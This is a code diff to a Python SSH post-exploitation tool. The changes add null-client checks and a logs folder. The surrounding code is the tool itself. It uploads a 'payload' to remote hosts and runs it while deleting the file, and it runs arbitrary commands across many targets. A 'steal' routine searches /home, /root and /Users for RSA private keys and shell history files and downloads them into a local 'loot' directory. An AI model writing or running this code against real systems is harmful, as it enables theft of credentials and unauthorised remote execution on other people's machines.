@@ -15,7 +15,9 @@ CRED = '\033[91m'
 CEND = '\033[0m'
 CGREEN  = '\33[32m'
 CYELLOW = '\33[33m'
-paramiko.util.log_to_file("filename.log")
+if not os.path.exists("logs"):
+    os.makedirs("logs")
+paramiko.util.log_to_file("logs/paramiko.log")
 
 
 def randomword(length):
@@ -53,45 +55,47 @@ def connect(ip, username, password, identity_file):
 
 def copy_exec(ip, username, password, identity_file, file, timeout):
     client = connect(ip, username, password, identity_file)
-    print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
-    sftp = client.open_sftp()
-    sftp.put('output/' + file, file)
-    print CGREEN + "[+] Payload copied to " + str(ip) + "!" + CEND
-    print CGREEN + "[!] Attempting to execute payload on " + str(ip) + "..." + CEND
-    stdin, stdout, stderr = client.exec_command(" chmod +x "+ file +"; sleep 1; rm "+ file + " & ./" + file, timeout=timeout)
-    try:
-        for line in stdout:
-            print line
-    except socket.timeout:
-        print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
+    if client:
+        print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
+        sftp = client.open_sftp()
+        sftp.put('output/' + file, file)
+        print CGREEN + "[+] Payload copied to " + str(ip) + "!" + CEND
+        print CGREEN + "[!] Attempting to execute payload on " + str(ip) + "..." + CEND
+        stdin, stdout, stderr = client.exec_command(" chmod +x "+ file +"; sleep 1; rm "+ file + " & ./" + file, timeout=timeout)
+        try:
+            for line in stdout:
+                print line
+        except socket.timeout:
+            print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
 
 
 def steal(ip, username, password, identity_file, type, timeout):
     client = connect(ip, username, password, identity_file)
-    if type == "keys":
-        command = "find /home/ /root/ /Users/ -type f -exec awk 'FNR==1 && /RSA PRIVATE KEY/ { print FILENAME  }; FNR>1 {nextfile}' {} + 2>/dev/null "
-    if type == "history":
-        command = "find /home /root /Users -name .\*_history -type f 2>/dev/null"
-    stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
-    try:
-        sftp = client.open_sftp()
-        for line in stdout:
-            line = line.rstrip()
-            if not os.path.exists("loot/" + type + "/" + str(ip)):
-                os.makedirs("loot/" + type + "/" + str(ip))
-            print CGREEN + "[+] Copying " + line + " from " + str(ip) + "!" + CEND
-            try:
-                sftp.get(line, "loot/" + type + "/" + str(ip) + "/" + line.replace("/", "_"))
-            except:
-                print CRED + "[-] Failed to copy " + line + " from " + str(ip) + CEND
-    except socket.timeout:
-        print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
+    if client:
+        if type == "keys":
+            command = "find /home/ /root/ /Users/ -type f -exec awk 'FNR==1 && /RSA PRIVATE KEY/ { print FILENAME  }; FNR>1 {nextfile}' {} + 2>/dev/null "
+        if type == "history":
+            command = "find /home /root /Users -name .\*_history -type f 2>/dev/null"
+        stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
+        try:
+            sftp = client.open_sftp()
+            for line in stdout:
+                line = line.rstrip()
+                if not os.path.exists("loot/" + type + "/" + str(ip)):
+                    os.makedirs("loot/" + type + "/" + str(ip))
+                print CGREEN + "[+] Copying " + line + " from " + str(ip) + "!" + CEND
+                try:
+                    sftp.get(line, "loot/" + type + "/" + str(ip) + "/" + line.replace("/", "_"))
+                except:
+                    print CRED + "[-] Failed to copy " + line + " from " + str(ip) + CEND
+        except socket.timeout:
+            print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
 
 
 def execute_command(ip, username, password, identity_file, command, timeout):
     client = connect(ip, username, password, identity_file)
     try:
-        if client != False:
+        if client:
             stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
             print CGREEN + "[+] Executed on " + str(ip) + "..." + CEND
             for line in stdout:
@@ -342,7 +346,9 @@ def main():
     parser.add_argument('-o', '--options', help='Options for module', required=False)
     args = parser.parse_args()
     targets = parse_targets(args.target)
-
+    if not args.command and not args.module:
+        for ip in targets:
+            connect(ip, args.username, args.password, args.identity_file)
     if args.command:
         print CGREEN + "[!] Running custom command " + "\"" + args.command + "\"..." + CEND
         start_thread(targets, "execute_command", [22, args.username, args.password, args.identity_file, args.command, 10])
